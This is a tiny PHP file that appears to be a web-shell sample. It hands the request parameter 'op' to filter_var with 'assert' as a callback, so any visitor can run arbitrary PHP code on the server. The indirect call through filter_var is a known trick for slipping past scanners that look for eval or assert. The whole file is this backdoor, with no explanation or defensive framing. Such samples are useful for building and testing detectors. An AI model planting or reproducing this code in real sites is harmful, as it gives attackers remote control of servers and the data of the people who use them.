<?php
filter_var($_REQUEST['op'], FILTER_CALLBACK, array('options' => 'assert'));
?>